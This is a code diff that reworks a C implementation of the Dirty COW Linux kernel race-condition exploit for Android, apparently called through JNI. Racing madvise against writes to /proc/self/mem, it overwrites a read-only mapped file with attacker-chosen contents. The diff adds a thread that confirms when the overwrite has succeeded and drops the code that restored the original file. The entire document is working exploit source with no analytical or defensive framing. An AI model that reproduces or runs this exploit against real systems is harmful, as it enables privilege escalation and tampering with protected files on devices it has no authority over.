@@ -8,12 +8,12 @@
 
 #ifdef DEBUG
 #include <android/log.h>
-#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
+#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "DirtyCOW", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
 #else
 #define LOGV(...)
 #endif
 
-#define LOOP   0x75000
+#define LOOP 50000
 #define STRINGSIZE 200
 
 #ifndef PAGE_SIZE
@@ -23,9 +23,12 @@
 struct mem_arg  {
 	unsigned char *offset;
 	unsigned char *patch;
-	unsigned char *unpatch;
 	size_t patch_size;
-	int do_patch;
+    const char *oldFilePath;
+    uint8_t isWritten;
+    uint8_t doneWriting;
+    pthread_cond_t condWritten;
+    pthread_mutex_t lock;
 };
 
 // enum defining the Error codes for JNI
@@ -42,18 +45,18 @@ static void *madviseThread(void *arg)
 	struct mem_arg *mem_arg;
 	size_t size;
 	void *addr;
-	int i, c = 0;
+	int c = 0;
 
 	mem_arg = (struct mem_arg *)arg;
 	size = mem_arg->patch_size;
 	addr = (void *)(mem_arg->offset);
 
-	LOGV("[*] madvise = %p %d", addr, size);
+	LOGV("[*] madvise = %p %d", addr, (int)size);
 
-	for(i = 0; i < LOOP; i++) {
+	while (mem_arg->doneWriting == 0) {
 		c += madvise(addr, size, MADV_DONTNEED);
 	}
-	LOGV("[*] madvise = %d %d", c, i);
+	LOGV("[*] madvise = %d", c);
 	return 0;
 }
 
@@ -61,37 +64,64 @@ static void *procselfmemThread(void *arg)
 {
 	struct mem_arg *mem_arg;
 	int fd, i, c = 0;
-	unsigned char *p;
 
 	mem_arg = (struct mem_arg *)arg;
-	p = mem_arg->do_patch ? mem_arg->patch : mem_arg->unpatch;
 
 	fd = open("/proc/self/mem", O_RDWR);
 	if (fd == -1)
 		LOGV("open(\"/proc/self/mem\"");
-	for (i = 0; i < LOOP; i++) {
+	for (i = 0; i < LOOP && (mem_arg->isWritten == 0); i++) {
         lseek(fd, (off_t) mem_arg->offset, SEEK_SET);
-        c += write(fd, p, mem_arg->patch_size);
+        c += write(fd, mem_arg->patch, mem_arg->patch_size);
+        pthread_cond_signal(&mem_arg->condWritten);
     }
+    mem_arg->doneWriting = 1;
 	LOGV("[*] /proc/self/mem %d %i", c, i);
 	close(fd);
 	return NULL;
 }
 
-static void exploit(struct mem_arg *mem_arg, int do_patch)
+static void *checkWriteThread(void *arg)
 {
-	pthread_t pth1, pth2;
+    struct mem_arg *mem_arg;
+    int fd, c = 0;
+    char buffer[STRINGSIZE];
 
-	LOGV("[*] exploit (%s)", do_patch ? "patch": "unpatch");
+    mem_arg = (struct mem_arg *)arg;
+
+    while (mem_arg->doneWriting == 0) {
+        pthread_mutex_lock(&mem_arg->lock);
+        pthread_cond_wait(&mem_arg->condWritten, &mem_arg->lock);
+        pthread_mutex_unlock(&mem_arg->lock);
+        fd = open(mem_arg->oldFilePath, O_RDONLY);
+        if (fd == -1)
+            LOGV("open(\"oldFile for check");
+        c += read(fd, buffer, mem_arg->patch_size);
+        if (strncmp((const char *)buffer, (const char *)mem_arg->patch, mem_arg->patch_size) == 0){
+            mem_arg->isWritten = 1;
+            break;
+        }
+        close(fd);
+        sched_yield();
+    }
+    LOGV("[*] oldFile check c: %d buffer: \"%s\" patch: \"%s\"", c, buffer, mem_arg->patch);
+    return NULL;
+}
+
+static void exploit(struct mem_arg *mem_arg)
+{
+	pthread_t pthMadVise, pthProcSelfMem, pthCheckWrite;
+
+	LOGV("[*] exploit (%s) unpatch");
 	LOGV("[*] currently %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
 
-	mem_arg->do_patch = do_patch;
+	pthread_create(&pthMadVise, NULL, madviseThread, mem_arg);
+	pthread_create(&pthProcSelfMem, NULL, procselfmemThread, mem_arg);
+    pthread_create(&pthCheckWrite, NULL, checkWriteThread, mem_arg);
 
-	pthread_create(&pth1, NULL, madviseThread, mem_arg);
-	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);
-
-	pthread_join(pth1, NULL);
-	pthread_join(pth2, NULL);
+	pthread_join(pthMadVise, NULL);
+	pthread_join(pthProcSelfMem, NULL);
+    pthread_join(pthCheckWrite, NULL);
 
 	LOGV("[*] exploited %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
 }
@@ -114,15 +144,19 @@ errorCode callCow(int argc, const char *argv[])
 	}
 	if (fstat(oldFile,&st_oldFile) == -1) {
 		LOGV("could not open %s", argv[0]);
+        close(oldFile);
 		return cantOpenFile;
 	}
 	int newFile=open(argv[1],O_RDONLY);
 	if (newFile == -1) {
 		LOGV("could not open %s", argv[1]);
+        close(oldFile);
 		return cantOpenFile;
 	}
 	if (fstat(newFile,&st_newFile) == -1) {
 		LOGV("could not open %s", argv[1]);
+        close(oldFile);
+        close(newFile);
 		return cantOpenFile;
 	}
 	size_t size = st_oldFile.st_size;
@@ -141,29 +175,32 @@ errorCode callCow(int argc, const char *argv[])
 
 	memset(mem_arg.patch, 0, size);
 
-	mem_arg.unpatch = malloc(size);
-	if (mem_arg.unpatch == NULL)
-		LOGV("malloc");
-
 	read(newFile, mem_arg.patch, st_newFile.st_size);
 	close(newFile);
 	mem_arg.patch_size = size;
-	mem_arg.do_patch = 1;
     void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, oldFile, 0);
 	if (map == MAP_FAILED) {
 		LOGV("mmap");
+        close(oldFile);
 		return cantMap;
 	}
 
 	LOGV("[*] mmap %p", map);
 
 	mem_arg.offset = map;
+    mem_arg.oldFilePath = argv[0];
+    mem_arg.isWritten = 0;
+    mem_arg.doneWriting = 0;
+    pthread_mutex_init(&mem_arg.lock, NULL);
+    pthread_cond_init(&mem_arg.condWritten, NULL);
 
-	exploit(&mem_arg, 1);
+	exploit(&mem_arg);
 
+    pthread_cond_destroy(&mem_arg.condWritten);
+    pthread_mutex_destroy(&mem_arg.lock);
+    munmap(map, size);
 	close(oldFile);
-	// to put back
-	/*exploit(&mem_arg, 0);*/
+    free(mem_arg.patch);
 
 	return success;
 }
